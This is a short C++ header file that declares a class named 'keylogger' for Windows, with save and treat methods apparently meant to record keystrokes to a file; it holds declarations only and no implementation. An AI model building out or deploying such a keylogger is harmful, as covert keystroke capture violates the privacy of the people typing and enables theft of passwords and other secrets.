#ifndef KEYLOGGER_HPP_
#define KEYLOGGER_HPP_

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>

using namespace std;

class keylogger
{
    public :
		keylogger();

		virtual ~keylogger();

		virtual void save(int);

		virtual void save(LPCSTR);

		void treat(int);
};

#endif
